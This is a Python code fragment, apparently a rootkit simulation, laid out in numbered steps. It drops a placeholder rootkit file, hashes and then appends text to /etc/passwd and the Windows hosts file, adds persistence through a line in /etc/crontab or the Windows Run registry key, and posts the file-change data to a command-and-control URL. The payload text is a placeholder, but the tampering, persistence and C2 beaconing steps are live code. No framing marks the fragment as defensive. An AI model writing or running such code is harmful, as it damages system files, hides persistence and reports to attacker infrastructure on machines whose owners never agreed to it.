    # Step 1: Install the rootkit
    rootkit_path = os.path.join(target_path, 'rootkit.bin')
    with open(rootkit_path, 'w') as f:
        f.write('This is a rootkit file.')
    
    # Step 2: Monitor file integrity
    critical_files = ['/etc/passwd', 'C:\\Windows\\System32\\drivers\\etc\\hosts']
    file_hashes = {}
    for file in critical_files:
        if os.path.exists(file):
            with open(file, 'rb') as f:
                file_hashes[file] = hashlib.sha256(f.read()).hexdigest()
    
    # Step 3: Tamper with critical files
    for file in critical_files:
        if os.path.exists(file):
            with open(file, 'a') as f:
                f.write('\n# This file has been tampered with by the rootkit.\n')
    
    # Step 4: Establish persistence
    if os.name == 'posix':
        # Linux: Add to crontab
        with open('/etc/crontab', 'a') as f:
            f.write('* * * * * /bin/bash -c "echo This is a rootkit file > /tmp/rootkit.log"\n')
    elif os.name == 'nt':
        # Windows: Add to registry
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'Rootkit', 0, winreg.REG_SZ, rootkit_path)
        winreg.CloseKey(key)
    
    # Step 5: Communicate with C2 server
    for file, original_hash in file_hashes.items():
        with open(file, 'rb') as f:
            new_hash = hashlib.sha256(f.read()).hexdigest()
        if original_hash != new_hash:
            data = {
                'file': file,
                'original_hash': original_hash,
                'new_hash': new_hash
            }
            requests.post(c2_url, json=data)
